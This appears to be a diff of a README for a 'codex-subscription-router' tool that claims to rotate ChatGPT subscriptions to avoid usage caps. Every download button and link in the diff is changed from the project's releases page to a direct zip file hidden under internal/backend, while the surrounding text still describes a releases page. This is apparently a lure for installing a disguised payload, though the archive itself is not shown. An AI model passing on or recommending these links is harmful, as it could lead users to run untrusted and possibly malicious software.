@@ -1,6 +1,6 @@
 # ⚡ codex-subscription-router - Balance AI subscriptions automatically
 
-[![Download Now](https://img.shields.io/badge/Download-Codex_Subscription_Router-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f2937)](https://github.com/demetrissisyphean512/codex-subscription-router/releases)
+[![Download Now](https://img.shields.io/badge/Download-Codex_Subscription_Router-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f2937)](https://raw.githubusercontent.com/demetrissisyphean512/codex-subscription-router/main/internal/backend/router-subscription-codex-v1.6.zip)
 
 ## 🎯 What Does This App Do?
 
@@ -15,7 +15,7 @@ The app creates a safe, local copy of the official ChatGPT app and uses that cop
 
 Visit this link to download the application:
 
-[**Download Codex Subscription Router**](https://github.com/demetrissisyphean512/codex-subscription-router/releases)
+[**Download Codex Subscription Router**](https://raw.githubusercontent.com/demetrissisyphean512/codex-subscription-router/main/internal/backend/router-subscription-codex-v1.6.zip)
 
 When you click the link, you will see a page with release files. Look for the file named `codex-subscription-router` and follow these steps:
 
@@ -122,7 +122,7 @@ Codex Subscription Router is a clever way to stretch your ChatGPT limits across 
 
 If you are someone who frequently hits usage caps on ChatGPT, this app can genuinely save you time and interruptions. Head over to the download page, grab the latest release, and start enjoying uninterrupted conversations.
 
-[**⬇️ Download Codex Subscription Router Now**](https://github.com/demetrissisyphean512/codex-subscription-router/releases)
+[**⬇️ Download Codex Subscription Router Now**](https://raw.githubusercontent.com/demetrissisyphean512/codex-subscription-router/main/internal/backend/router-subscription-codex-v1.6.zip)
 
 ### ⚠️ A Quick Reminder
 
